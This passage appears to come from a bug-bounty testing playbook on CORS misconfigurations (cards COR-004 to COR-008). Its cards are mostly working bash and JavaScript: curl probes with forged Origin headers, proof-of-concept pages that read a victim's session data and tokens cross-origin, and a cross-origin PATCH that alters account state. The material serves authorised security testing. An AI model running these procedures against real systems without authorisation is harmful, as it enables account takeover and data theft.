  mkdir -p "$E/tools"; [ -s "$E/tools/c.pem" ] || openssl req -x509 -newkey rsa:2048 -nodes -days 30 -subj /CN=cor-poc \
    -keyout "$E/tools/k.pem" -out "$E/tools/c.pem" 2>/dev/null
  [ -s "$E/tools/cor-poc.js" ] || cat > "$E/tools/cor-poc.js" <<'JS'
  // cor-poc.js <URL B's browser opens> <page file served at that URL, or - to open the real URL> <evidence dir> <the HDR arguments>
  // B's session: $E/accounts/B.state.json, the cookies with their real SameSite, Secure and Domain. A page file is served
  // by a local HTTPS server that Chromium reaches through --host-resolver-rules, so the page has exactly the URL's origin
  // and the target receives a real cross-origin request. No page.route(): while interception is on, Playwright answers
  // CORS preflights itself. Only HDR's User-Agent is applied: a header the tool adds to the page's requests can force a
  // preflight that a real victim's browser never sends. Writes read.txt (the page text), log.txt and poc.png.
  const { chromium } = require('playwright'), https = require('https'), fs = require('fs');
  (async () => {
    const [url, file, dir, ...h] = process.argv.slice(2), u = new URL(url), E = process.env.E, st = `${E}/accounts/B.state.json`;
    let srv, args = [];
    if (file !== '-') {
      const page = fs.readFileSync(file);
      srv = https.createServer({ key: fs.readFileSync(`${E}/tools/k.pem`), cert: fs.readFileSync(`${E}/tools/c.pem`) },
        (q, r) => { r.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }); r.end(page); }).listen(0, '127.0.0.1');
      await new Promise(r => srv.on('listening', r)); args = [`--host-resolver-rules=MAP ${u.hostname} 127.0.0.1:${srv.address().port}`];
    }
    const b = await chromium.launch({ args }), log = [`chromium ${b.version()}`], ua = h.includes('-A') ? h[h.indexOf('-A') + 1] : undefined;
    const c = await b.newContext({ storageState: fs.existsSync(st) ? st : undefined, ignoreHTTPSErrors: true, userAgent: ua }), p = await c.newPage();
    p.on('response', async s => { try { const q = s.request(); if (new URL(q.url()).origin === u.origin) return;
      const qh = await q.allHeaders(), sh = await s.allHeaders(), ck = (qh.cookie || '').split(/; */).filter(Boolean).map(x => x.split('=')[0]);
      log.push(`${q.method()} ${q.url()} ${s.status()} origin=${qh.origin || '-'} cookies=${ck.join(',') || '-'} acao=${sh['access-control-allow-origin'] || '-'} acac=${sh['access-control-allow-credentials'] || '-'}`); } catch (e) {} });
    p.on('requestfailed', q => log.push(`${q.method()} ${q.url()} failed: ${q.failure().errorText}`));
    await p.goto(url).catch(e => log.push(String(e))); await p.waitForTimeout(6000);
    fs.writeFileSync(`${dir}/read.txt`, await p.innerText('body').catch(() => '')); fs.writeFileSync(`${dir}/log.txt`, log.join('\n') + '\n');
    await p.screenshot({ path: `${dir}/poc.png`, fullPage: true }); console.log(log.join('\n')); await b.close(); if (srv) srv.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$E/tools/cor-poc.js" "https://cor004-sim.$R/sim.html" "$D/sim.html" "$D/sim" "${HDR[@]}"; cat "$D/sim/read.txt"
  [ -s "$D/foothold.url" ] && NODE_PATH="$(npm root -g)" node "$E/tools/cor-poc.js" "$(cat "$D/foothold.url")" - "$D/foothold" "${HDR[@]}" && cat "$D/foothold/read.txt"
  ```
- **Proof:** the foothold, from its own card (the XSS's URL, or the claimed host's proof); the browser run on the
  real foothold URL: `foothold/read.txt` and `foothold/poc.png` showing B's data under the sibling's origin, and the
  `foothold/log.txt` line with `origin=` the sibling, B's session cookie among `cookies=`, `acao=` the sibling and
  `acac=true`; the trust table. Then remove the stored payload or the page on the claimed host.
- **Not a finding when:** the trust has no foothold: a header observation (`cors`); park it with the simulated run
  as the note. The foothold serves our script under `Content-Security-Policy: sandbox` or inside a sandboxed frame
  (common for user uploads): its origin is `null`, and only COR-002 helps. The policy lists named hosts, not a
  pattern, and the foothold is not one of them. The foothold sits on another registrable domain
  (`example-cdn.com`): neither the trust nor same-site applies. An XSS on this host's own origin needs no CORS at all
  (XSS-018).
- **Escalate:** COR-006 from the foothold, which reads tokens the same way; CSR-011 for writes, which a same-site
  page sends without any CORS trust; STO-010 when the claimed host also receives B's parent-domain cookies.

### COR-005 · The allow-list names an origin outside the company's control: a shared hosting platform, a browser-extension scheme, localhost, plain HTTP, or a preview or staging host

| | |
|---|---|
| **Severity** | Medium standalone for a platform or extension origin anyone can obtain, rated by what the page reads; High with COR-006; Low for localhost, plain-HTTP or named non-production origins until script runs there |
| **Requires** | cookie-auth, account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Origin Validation Error · CWE-346, CWE-942 |
| **Prior art** | #412490, #430249, #219014 |

- **Where:** hosts with an allow-list (COR-001's foreign origin refused). The list often leaks in the client:
  bundles, configuration files (`/config.json`, `/env.js`, `/__env.js`) and error messages. Front ends deployed on
  Vercel or Netlify get one URL per branch preview, and the API's list gets widened to let them in; mobile and
  desktop wrappers add their own schemes.
- **Test:** send one origin from each family and keep the ones answered with themselves and credentials. A pattern
  on a shared platform (`*.vercel.app`, `*.netlify.app`, `*.herokuapp.com`, `*.github.io`, `*.pages.dev`,
  `*.web.app`, `*.azurewebsites.net`, `*.cloudfront.net`, `*.ngrok-free.app`, or a project-name pattern such as
  `<company>-*.vercel.app`) is an origin anyone gets with a free account. An extension scheme lets any installed
  extension read, even one that asked for no permissions. `localhost`, `127.0.0.1`, `http://` and named staging
  hosts need script on the victim's machine, a network position, or a foothold on that host.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/COR-005"; mkdir -p "$D"; C="$D/B-cookie.headers"; grep -i '^cookie:' "$E/accounts/B.headers" > "$C"
  R=$(printf '%s' "$H" | awk -F. '{print $(NF-1)"."$NF}'); N=${R%%.*}       # N: the company label, as preview names use it
  U="$T/api/v1/me"
  # 1. allow-list entries the client gives away
  grep -rhoiE '.{0,40}(allowed_?origins|cors|origin_?whitelist|origins).{0,160}' "$E"/recon/*/js/ 2>/dev/null |
    grep -iE 'localhost|127\.0\.0\.1|http://|vercel|netlify|heroku|github\.io|pages\.dev|ngrok|staging|preview|extension' | sort -u | head -20
  # 2. one origin per family, and a foreign control
  for o in "https://cor005.vercel.app" "https://$N-cor005.vercel.app" "https://cor005.netlify.app" "https://cor005.herokuapp.com" \
           "https://cor005.github.io" "https://cor005.pages.dev" "https://cor005.web.app" "https://cor005.azurewebsites.net" \
           "https://cor005.cloudfront.net" "https://cor005.ngrok-free.app" "chrome-extension://abcdefghijklmnopabcdefghijklmnop" \
           "moz-extension://4b1d0c6e-0000-4000-8000-000000000005" "http://localhost" "http://localhost:3000" "http://127.0.0.1:8080" \
           "http://$R" "http://www.$R" "https://staging.$R" "https://dev.$R" "https://preview.$R" "https://cor005.example"; do
    printf '%-56s ' "$o"; curl -sS "${HDR[@]}" -H @"$C" -H "Origin: $o" -D- -o /dev/null "$U" | tr -d '\r' |
      grep -i -E '^access-control-allow-(origin|credentials)' | paste -sd ' ' -; sleep 1; done | tee "$D/families.txt"
  # 3. an accepted platform origin, served as itself to B's browser
  O="https://cor005.vercel.app"                # the accepted origin from step 2
  [ -s "$E/accounts/B.state.json" ] || npx --yes playwright open --save-storage="$E/accounts/B.state.json" "$T/"   # sign in as B, close the window
  jq -r '.cookies[] | [.domain, .name, .sameSite, "secure=\(.secure)"] | @tsv' "$E/accounts/B.state.json"
  cat > "$D/poc.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>COR-005</title><pre id="o">reading $U</pre>
  <script>fetch("$U", {credentials: "include"}).then(r => r.text())
    .then(t => { document.getElementById("o").textContent = location.origin + " read " + t.length + " bytes of $U:\n" + t.slice(0, 3000); })
    .catch(e => { document.getElementById("o").textContent = "blocked: " + e; });</script>
  EOF
  # victim browser: the same helper in every COR card, written once per engagement (Playwright for Node)
  mkdir -p "$E/tools"; [ -s "$E/tools/c.pem" ] || openssl req -x509 -newkey rsa:2048 -nodes -days 30 -subj /CN=cor-poc \
    -keyout "$E/tools/k.pem" -out "$E/tools/c.pem" 2>/dev/null
  [ -s "$E/tools/cor-poc.js" ] || cat > "$E/tools/cor-poc.js" <<'JS'
  // cor-poc.js <URL B's browser opens> <page file served at that URL, or - to open the real URL> <evidence dir> <the HDR arguments>
  // B's session: $E/accounts/B.state.json, the cookies with their real SameSite, Secure and Domain. A page file is served
  // by a local HTTPS server that Chromium reaches through --host-resolver-rules, so the page has exactly the URL's origin
  // and the target receives a real cross-origin request. No page.route(): while interception is on, Playwright answers
  // CORS preflights itself. Only HDR's User-Agent is applied: a header the tool adds to the page's requests can force a
  // preflight that a real victim's browser never sends. Writes read.txt (the page text), log.txt and poc.png.
  const { chromium } = require('playwright'), https = require('https'), fs = require('fs');
  (async () => {
    const [url, file, dir, ...h] = process.argv.slice(2), u = new URL(url), E = process.env.E, st = `${E}/accounts/B.state.json`;
    let srv, args = [];
    if (file !== '-') {
      const page = fs.readFileSync(file);
      srv = https.createServer({ key: fs.readFileSync(`${E}/tools/k.pem`), cert: fs.readFileSync(`${E}/tools/c.pem`) },
        (q, r) => { r.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }); r.end(page); }).listen(0, '127.0.0.1');
      await new Promise(r => srv.on('listening', r)); args = [`--host-resolver-rules=MAP ${u.hostname} 127.0.0.1:${srv.address().port}`];
    }
    const b = await chromium.launch({ args }), log = [`chromium ${b.version()}`], ua = h.includes('-A') ? h[h.indexOf('-A') + 1] : undefined;
    const c = await b.newContext({ storageState: fs.existsSync(st) ? st : undefined, ignoreHTTPSErrors: true, userAgent: ua }), p = await c.newPage();
    p.on('response', async s => { try { const q = s.request(); if (new URL(q.url()).origin === u.origin) return;
      const qh = await q.allHeaders(), sh = await s.allHeaders(), ck = (qh.cookie || '').split(/; */).filter(Boolean).map(x => x.split('=')[0]);
      log.push(`${q.method()} ${q.url()} ${s.status()} origin=${qh.origin || '-'} cookies=${ck.join(',') || '-'} acao=${sh['access-control-allow-origin'] || '-'} acac=${sh['access-control-allow-credentials'] || '-'}`); } catch (e) {} });
    p.on('requestfailed', q => log.push(`${q.method()} ${q.url()} failed: ${q.failure().errorText}`));
    await p.goto(url).catch(e => log.push(String(e))); await p.waitForTimeout(6000);
    fs.writeFileSync(`${dir}/read.txt`, await p.innerText('body').catch(() => '')); fs.writeFileSync(`${dir}/log.txt`, log.join('\n') + '\n');
    await p.screenshot({ path: `${dir}/poc.png`, fullPage: true }); console.log(log.join('\n')); await b.close(); if (srv) srv.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$E/tools/cor-poc.js" "$O/poc.html" "$D/poc.html" "$D" "${HDR[@]}"; cat "$D/read.txt"
  ```
  An accepted extension origin is shown with an unpacked extension that asks for no permissions and whose own page
  runs the same `fetch` (Chromium's `--load-extension`); localhost and named staging origins have no page of ours to
  serve until a foothold exists there.
- **Proof:** `families.txt` with the accepted origin next to the refused foreign control; for a platform origin, the
  browser run as that origin (`read.txt`, `poc.png`, `log.txt`) and one sentence on how anyone obtains the name (a
  free account on the platform; none was created). A real page on the platform under the operator's own account is
  the strongest form when the programme asks for a live demonstration.
- **Not a finding when:** the accepted origins are the company's own app schemes (`capacitor://localhost`,
  `ionic://localhost`, `app://`, `file://` arriving as `null`): only the company's app sends them. `localhost` or a
  private address with no way to run script there. `http://` origins need a network position (`mitm`). An extension
  origin needs the victim to install the attacker's extension (`social-engineering` on most programmes; #412490 was
  paid by a programme whose product is itself an extension). A named staging or preview host of the company with
  nothing of ours on it is a foothold target for COR-004, not a finding.
- **Escalate:** a named sibling goes through COR-004's steps 2 to 4 (can it be claimed, does it have an XSS, can
  users publish there); COR-006 with an accepted platform origin.

### COR-006 · A cookie-authenticated response that carries a token, API key, CSRF token or reset link is readable from an attacker's origin, so the read becomes account takeover

| | |
|---|---|
| **Severity** | High standalone when the credential the page read answers one identity call as B (bearer token, session id, API key, reset link); Medium for a CSRF token, rated by the action it unlocks |
| **Requires** | cookie-auth, account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Origin Validation Error · CWE-346, CWE-942 |
| **Prior art** | #688567, #426147, #685032, #708886 |

- **Where:** cookie-authenticated responses that contain a credential: token issue and refresh calls the front end
  makes with its cookie (`/api/token`, `/auth/refresh`, `/session`, an `/oauth/token` that accepts the session
  cookie), API keys and personal access tokens shown in settings, a CSRF token in JSON or in the
  `<meta name="csrf-token">` of an HTML page, WebSocket or single-sign-on tickets, invitation and password-reset
  links an admin view lists, authorization codes returned as JSON. Step 1 of **How** lists them by field name.
- **Test:** an origin the endpoint trusts with credentials (COR-001, COR-002, COR-003, COR-005, or script on a
  COR-004 sibling) plus a response holding a credential turns a read into a takeover: a bearer token or API key
  works from anywhere, and a CSRF token lets the page send the protected request. Prove the read in the browser and
  the credential's power with one identity call, and nothing more.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/COR-006"; mkdir -p "$D"; C="$D/B-cookie.headers"; grep -i '^cookie:' "$E/accounts/B.headers" > "$C"
  R=$(printf '%s' "$H" | awk -F. '{print $(NF-1)"."$NF}')     # the registrable domain; set it by hand for co.uk-style suffixes
  # 1. cookie-authenticated responses that carry a credential: field names and four characters only
  { ls "$E/recon/$H/requests/"*.http; grep -l -s -F "$H" "$E"/recon/*/requests/*.http; } 2>/dev/null | sort -u |
    xargs -r awk 'FNR==1 && $1=="GET" {print $2}' | sed -E 's#^https?://[^/]+##' | sort -u > "$D/paths.txt"
  while read -r p; do curl -sS "${HDR[@]}" -H @"$C" "$T$p" |
    grep -o -i -E '"[a-z_]*(token|api_?key|secret|csrf|session|ticket|reset)[a-z_]*" *: *"[^"]{4}|name="csrf[-_a-z]*" content="[^"]{4}' |
    sed "s#^#$p  #"; sleep 1; done < "$D/paths.txt" | tee "$D/credentials.txt"
  # 2. an attacker origin the endpoint answers with itself and credentials: foreign, null, an invented sibling
  U="$T/api/v1/session"; K=access_token         # a path and a field name from step 1
  for o in "https://cor006-$RANDOM.example" null "https://cor006-$RANDOM.$R"; do printf '%-36s ' "$o"
    curl -sS "${HDR[@]}" -H @"$C" -H "Origin: $o" -D- -o /dev/null "$U" | tr -d '\r' |
      grep -i -E '^access-control-allow-(origin|credentials)' | paste -sd ' ' -; sleep 1; done
  O="https://cor006-poc.example"   # any name when a foreign origin is echoed; else COR-003's or COR-005's name. null: COR-002's frame; a sibling: COR-004's foothold
  # 3. the page reads the credential and shows its name, its length, and its first and last four characters only
  [ -s "$E/accounts/B.state.json" ] || npx --yes playwright open --save-storage="$E/accounts/B.state.json" "$T/"   # sign in as B, close the window
  cat > "$D/poc.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>COR-006</title><pre id="o">reading $U</pre>
  <script>fetch("$U", {credentials: "include"}).then(r => r.text()).then(t => {
    var m = t.match(/"$K" *: *"([^"]+)"/) || t.match(/name="csrf[-_a-z]*" content="([^"]+)"/i);
    document.getElementById("o").textContent = location.origin + " read " + (m ? "$K: " + m[1].slice(0, 4) + "..." + m[1].slice(-4) + " (" + m[1].length + " characters)" : "no $K in " + t.length + " bytes");
  }).catch(e => { document.getElementById("o").textContent = "blocked: " + e; });</script>
  EOF
  #    a CSRF token instead: the page goes on to submit CSR-008's request with it, on B, and step 4 becomes B's state read back
  # victim browser: the same helper in every COR card, written once per engagement (Playwright for Node)
  mkdir -p "$E/tools"; [ -s "$E/tools/c.pem" ] || openssl req -x509 -newkey rsa:2048 -nodes -days 30 -subj /CN=cor-poc \
    -keyout "$E/tools/k.pem" -out "$E/tools/c.pem" 2>/dev/null
  [ -s "$E/tools/cor-poc.js" ] || cat > "$E/tools/cor-poc.js" <<'JS'
  // cor-poc.js <URL B's browser opens> <page file served at that URL, or - to open the real URL> <evidence dir> <the HDR arguments>
  // B's session: $E/accounts/B.state.json, the cookies with their real SameSite, Secure and Domain. A page file is served
  // by a local HTTPS server that Chromium reaches through --host-resolver-rules, so the page has exactly the URL's origin
  // and the target receives a real cross-origin request. No page.route(): while interception is on, Playwright answers
  // CORS preflights itself. Only HDR's User-Agent is applied: a header the tool adds to the page's requests can force a
  // preflight that a real victim's browser never sends. Writes read.txt (the page text), log.txt and poc.png.
  const { chromium } = require('playwright'), https = require('https'), fs = require('fs');
  (async () => {
    const [url, file, dir, ...h] = process.argv.slice(2), u = new URL(url), E = process.env.E, st = `${E}/accounts/B.state.json`;
    let srv, args = [];
    if (file !== '-') {
      const page = fs.readFileSync(file);
      srv = https.createServer({ key: fs.readFileSync(`${E}/tools/k.pem`), cert: fs.readFileSync(`${E}/tools/c.pem`) },
        (q, r) => { r.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }); r.end(page); }).listen(0, '127.0.0.1');
      await new Promise(r => srv.on('listening', r)); args = [`--host-resolver-rules=MAP ${u.hostname} 127.0.0.1:${srv.address().port}`];
    }
    const b = await chromium.launch({ args }), log = [`chromium ${b.version()}`], ua = h.includes('-A') ? h[h.indexOf('-A') + 1] : undefined;
    const c = await b.newContext({ storageState: fs.existsSync(st) ? st : undefined, ignoreHTTPSErrors: true, userAgent: ua }), p = await c.newPage();
    p.on('response', async s => { try { const q = s.request(); if (new URL(q.url()).origin === u.origin) return;
      const qh = await q.allHeaders(), sh = await s.allHeaders(), ck = (qh.cookie || '').split(/; */).filter(Boolean).map(x => x.split('=')[0]);
      log.push(`${q.method()} ${q.url()} ${s.status()} origin=${qh.origin || '-'} cookies=${ck.join(',') || '-'} acao=${sh['access-control-allow-origin'] || '-'} acac=${sh['access-control-allow-credentials'] || '-'}`); } catch (e) {} });
    p.on('requestfailed', q => log.push(`${q.method()} ${q.url()} failed: ${q.failure().errorText}`));
    await p.goto(url).catch(e => log.push(String(e))); await p.waitForTimeout(6000);
    fs.writeFileSync(`${dir}/read.txt`, await p.innerText('body').catch(() => '')); fs.writeFileSync(`${dir}/log.txt`, log.join('\n') + '\n');
    await p.screenshot({ path: `${dir}/poc.png`, fullPage: true }); console.log(log.join('\n')); await b.close(); if (srv) srv.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$E/tools/cor-poc.js" "$O/poc.html" "$D/poc.html" "$D" "${HDR[@]}"; cat "$D/read.txt"
  # 4. the same credential, read with B's cookie by curl, in one identity call that must answer as B (the header the API
  #    documents for it: Authorization: Bearer, X-API-Key, ...). A stable key matches the page's four characters; a fresh token per call does not.
  V=$(curl -sS "${HDR[@]}" -H @"$C" "$U" | grep -o -E "\"$K\" *: *\"[^\"]+\"" | head -1 | sed -E 's/.*"([^"]+)"$/\1/')
  printf 'curl read: %s...%s\n' "${V:0:4}" "${V: -4}"
  curl -sS "${HDR[@]}" -H "Authorization: Bearer $V" -o "$D/identity.json" -w 'identity call: %{http_code}\n' "$T/api/v1/me"; unset V
  grep -o -E '"(id|email|username)" *: *"?[^,"]+' "$D/identity.json" | head -3
  ```
- **Proof:** the page on the attacker origin showing the field name, the length and the first and last four
  characters (`read.txt`, `poc.png`); the `log.txt` line with the origin, B's session cookie name, `acao` and
  `acac`; the single identity call answering as B (status and B's user id), and nothing else done with the
  credential. For a CSRF token: B's state changed by the page's request carrying the token, then restored.
- **Not a finding when:** the value is public by design: a publishable payment key, a maps or analytics key, a
  Sentry DSN, a Firebase web configuration. The credential is bound to the browser or the origin (DPoP, a client
  certificate, an IP or device binding) and the identity call fails: rate the read as COR-001. The CSRF token guards
  nothing sensitive (`csrf-low`), or the action it guards also needs the current password or a second factor.
- **Escalate:** say what the credential can do by its scope or role, then stop: no second call. A CSRF token goes to
  CSR-008's account-change requests; a reset link or a session id is a takeover of B as it stands.

### COR-007 · The server approves a preflight from an attacker origin with credentials, so a page on another site sends JSON, custom-header or PUT, PATCH and DELETE requests as B

| | |
|---|---|
| **Severity** | Medium standalone for a change to B's account that no form could make; High when the request changes account control (e-mail, password, second factor, API keys, members and roles) |
| **Requires** | cookie-auth, state-change, account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352, CWE-346 |
| **Prior art** | #412490, #975983, #998457 |

- **Where:** state-changing requests in the map that a form cannot send: JSON bodies, custom headers
  (`X-Requested-With`, an `X-CSRF-Token` the server only checks for presence), PUT, PATCH and DELETE. The CSRF
  chapter counts these as safe because a preflight stands in the way; this card checks whether the server lets the
  preflight through. Most sensitive first: e-mail, password, second factor, API keys, members and roles, webhooks.
- **Test:** before such a request the browser sends `OPTIONS` with `Origin`, `Access-Control-Request-Method` and
  `Access-Control-Request-Headers`, and sends the real request with B's cookie only if the answer names the exact
  origin, carries `Access-Control-Allow-Credentials: true`, lists the method (unless it is GET, HEAD or POST) and
  lists every non-safelisted header. `*` in `Access-Control-Allow-Methods` or `Access-Control-Allow-Headers` does
  not count when credentials are sent. The real request then reaches the server and takes effect even when its own
  response is unreadable: a proxy or framework that answers every `OPTIONS` itself, in front of an application
  that sends no CORS headers, still lets writes through.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/COR-007"; mkdir -p "$D"; O="https://cor007-$RANDOM.example"
  # 1. state-changing requests a form cannot send, with what they carry besides cookies
  for f in $( { ls "$E/recon/$H/requests/"*.http; grep -l -s -F "$H" "$E"/recon/*/requests/*.http; } 2>/dev/null | sort -u); do
    head -1 "$f" | grep -q -E '^(POST|PUT|PATCH|DELETE) ' || continue
    printf '%s | %s\n' "$(head -1 "$f" | tr -d '\r')" "$(grep -i -o -E '^(content-type|x-[a-z-]+): *[^;]*' "$f" | tr -d '\r' | paste -sd ' ' -)"
  done | tee "$D/writes.txt"
  # 2. the preflight a browser sends from our origin before a JSON PATCH with cookies
  U="$T/api/v1/me"                             # a harmless field of B's own profile, from step 1
  curl -sS "${HDR[@]}" -X OPTIONS "$U" -H "Origin: $O" -H 'Access-Control-Request-Method: PATCH' \
    -H 'Access-Control-Request-Headers: content-type,x-requested-with' -D- -o /dev/null | tr -d '\r' | grep -i -E '^HTTP/|^access-control-' | tee "$D/preflight.txt"
  # 3. the page on $O sends the change; B's state read back is the proof (the fetch may reject while the change lands)
  [ -s "$E/accounts/B.state.json" ] || npx --yes playwright open --save-storage="$E/accounts/B.state.json" "$T/"   # sign in as B, close the window
  jq -r '.cookies[] | [.domain, .name, .sameSite, "secure=\(.secure)"] | @tsv' "$E/accounts/B.state.json"
  cat > "$D/poc.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>COR-007</title><pre id="o">sending</pre>
  <script>fetch("$U", {method: "PATCH", credentials: "include", headers: {"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"},
    body: JSON.stringify({bio: "cor007-cross-origin"})})
    .then(r => { document.getElementById("o").textContent = "PATCH sent from " + location.origin + ", status " + r.status; })
    .catch(e => { document.getElementById("o").textContent = "response unreadable (the request may still have been sent): " + e; });</script>
  EOF
  # victim browser: the same helper in every COR card, written once per engagement (Playwright for Node)
  mkdir -p "$E/tools"; [ -s "$E/tools/c.pem" ] || openssl req -x509 -newkey rsa:2048 -nodes -days 30 -subj /CN=cor-poc \
    -keyout "$E/tools/k.pem" -out "$E/tools/c.pem" 2>/dev/null
  [ -s "$E/tools/cor-poc.js" ] || cat > "$E/tools/cor-poc.js" <<'JS'
  // cor-poc.js <URL B's browser opens> <page file served at that URL, or - to open the real URL> <evidence dir> <the HDR arguments>
  // B's session: $E/accounts/B.state.json, the cookies with their real SameSite, Secure and Domain. A page file is served
  // by a local HTTPS server that Chromium reaches through --host-resolver-rules, so the page has exactly the URL's origin
  // and the target receives a real cross-origin request. No page.route(): while interception is on, Playwright answers
  // CORS preflights itself. Only HDR's User-Agent is applied: a header the tool adds to the page's requests can force a
  // preflight that a real victim's browser never sends. Writes read.txt (the page text), log.txt and poc.png.
  const { chromium } = require('playwright'), https = require('https'), fs = require('fs');
  (async () => {
    const [url, file, dir, ...h] = process.argv.slice(2), u = new URL(url), E = process.env.E, st = `${E}/accounts/B.state.json`;
    let srv, args = [];
    if (file !== '-') {
      const page = fs.readFileSync(file);
      srv = https.createServer({ key: fs.readFileSync(`${E}/tools/k.pem`), cert: fs.readFileSync(`${E}/tools/c.pem`) },
        (q, r) => { r.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }); r.end(page); }).listen(0, '127.0.0.1');
      await new Promise(r => srv.on('listening', r)); args = [`--host-resolver-rules=MAP ${u.hostname} 127.0.0.1:${srv.address().port}`];
    }
    const b = await chromium.launch({ args }), log = [`chromium ${b.version()}`], ua = h.includes('-A') ? h[h.indexOf('-A') + 1] : undefined;
    const c = await b.newContext({ storageState: fs.existsSync(st) ? st : undefined, ignoreHTTPSErrors: true, userAgent: ua }), p = await c.newPage();
    p.on('response', async s => { try { const q = s.request(); if (new URL(q.url()).origin === u.origin) return;
      const qh = await q.allHeaders(), sh = await s.allHeaders(), ck = (qh.cookie || '').split(/; */).filter(Boolean).map(x => x.split('=')[0]);
      log.push(`${q.method()} ${q.url()} ${s.status()} origin=${qh.origin || '-'} cookies=${ck.join(',') || '-'} acao=${sh['access-control-allow-origin'] || '-'} acac=${sh['access-control-allow-credentials'] || '-'}`); } catch (e) {} });
    p.on('requestfailed', q => log.push(`${q.method()} ${q.url()} failed: ${q.failure().errorText}`));
    await p.goto(url).catch(e => log.push(String(e))); await p.waitForTimeout(6000);
    fs.writeFileSync(`${dir}/read.txt`, await p.innerText('body').catch(() => '')); fs.writeFileSync(`${dir}/log.txt`, log.join('\n') + '\n');
    await p.screenshot({ path: `${dir}/poc.png`, fullPage: true }); console.log(log.join('\n')); await b.close(); if (srv) srv.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$E/tools/cor-poc.js" "$O/poc.html" "$D/poc.html" "$D" "${HDR[@]}"
  curl -sS "${HDR[@]}" $B "$U" | grep -o 'cor007-cross-origin' || echo 'state unchanged'
  # 4. restore B
  curl -sS "${HDR[@]}" $B -X PATCH "$U" -H 'Content-Type: application/json' --data-binary '{"bio":""}' -o /dev/null -w 'restored: %{http_code}\n'
  ```
- **Proof:** `preflight.txt` (our origin echoed, credentials allowed, the method and both headers listed); the
  `log.txt` line for the PATCH from `$O` with B's session cookie name, or its `failed:` line when the response was
  unreadable; B's state read back with the marker; then B restored. For the report, the same page aimed at the most
  sensitive request this card reaches, on B only.
- **Not a finding when:** the preflight names only the front end's origins, or offers `*` for methods or headers
  while credentials are on: the browser stops. A form could already send the request: that is a CSR card, not this
  one. The request still needs a CSRF token value the page cannot read: it arrives and is refused (look for the
  token with COR-006). B's cookie is `Lax`, `Strict` or has no attribute: no request from another site carries it,
  while a same-site foothold does (COR-004, CSR-011).
- **Escalate:** CSR-008's e-mail, password and second-factor requests through the same preflight, on B: one page
  visit takes over the account. With COR-006's token read as well, the page can do anything B can.

### COR-008 · A service on the victim's own machine or network answers any origin without a login, so any website the victim opens can read it or drive it

| | |
|---|---|
| **Severity** | High when the service gives any website its files, tokens or control of the product (shown with a read-only call); Medium for account or device details; Low for a version string |
| **Requires** | !login, oob, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Origin Validation Error · CWE-346, CWE-942 |
| **Prior art** | #746786, #873614 |

- **Where:** only where the programme lists a product that runs an HTTP service on the user's own machine or
  network: a desktop app or agent, a CLI with a local server, an extension's native host, a device's admin
  interface; and in-scope names that resolve to a loopback address for such a product. Install it on our own
  machine as the programme describes; the victim is us. The page must come from a public HTTPS host we control (the
  callback host when it can serve files; a public interaction service cannot).
- **Test:** a local service often trusts its network position: no login, and `Access-Control-Allow-Origin: *` or an
  echoed origin, so any website the victim opens can read it, and sometimes drive it. Chromium gates public pages
  that reach loopback or private addresses (Private Network Access preflights, now a Local Network Access
  permission prompt), so the result depends on the browser version: record it, and whether a prompt appeared. An
  `https://` page may reach `http://127.0.0.1`, but a plain-HTTP private address is blocked as mixed content.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/COR-008"; mkdir -p "$D"
  # 1. what the product listens on, on our own machine (the process column names it)
  { ss -ltnp 2>/dev/null || lsof -nP -iTCP -sTCP:LISTEN; } | tee "$D/listening.txt"
  #    in-scope names that resolve to loopback or private addresses
  for h in $(scripts/sane asset list | grep -o -E '[a-z0-9.-]+\.[a-z]{2,}' | sort -u); do
    a=$(dig +short "$h" | tail -1); printf '%s' "$a" | grep -q -E '^(127\.|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)' && echo "$h -> $a"; done
  # 2. a foreign Origin on the service, plain and as the private-network preflight newer browsers send
  L="http://127.0.0.1:43110"                   # the product's port from step 1
  curl -sS "${HDR[@]}" -H 'Origin: https://cor008-probe.example' -D- -o "$D/root.body" "$L/" | tr -d '\r' | grep -i -E '^HTTP/|^access-control'
  curl -sS "${HDR[@]}" -X OPTIONS -H 'Origin: https://cor008-probe.example' -H 'Access-Control-Request-Method: GET' \
    -H 'Access-Control-Request-Private-Network: true' -D- -o /dev/null "$L/" | tr -d '\r' | grep -i -E '^HTTP/|^access-control'
  # 3. the page, served over HTTPS from the callback host, opened in a browser on this machine
  cat > "$D/poc.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>COR-008</title><pre id="o">reading $L</pre>
  <script>fetch("$L/").then(r => r.text())
    .then(t => { document.getElementById("o").textContent = location.origin + " read from $L:\n" + t.slice(0, 3000); })
    .catch(e => { document.getElementById("o").textContent = "blocked: " + e; });</script>
  EOF
  #    on the callback host (ours), with poc.html copied to /srv/cor008:  caddy file-server --domain "cor008.$OOB" --root /srv/cor008
  # victim browser: the same helper in every COR card, written once per engagement (Playwright for Node)
  mkdir -p "$E/tools"; [ -s "$E/tools/cor-poc.js" ] || cat > "$E/tools/cor-poc.js" <<'JS'
  // cor-poc.js <URL B's browser opens> <page file served at that URL, or - to open the real URL> <evidence dir> <the HDR arguments>
  // B's session: $E/accounts/B.state.json, the cookies with their real SameSite, Secure and Domain. A page file is served
  // by a local HTTPS server that Chromium reaches through --host-resolver-rules, so the page has exactly the URL's origin
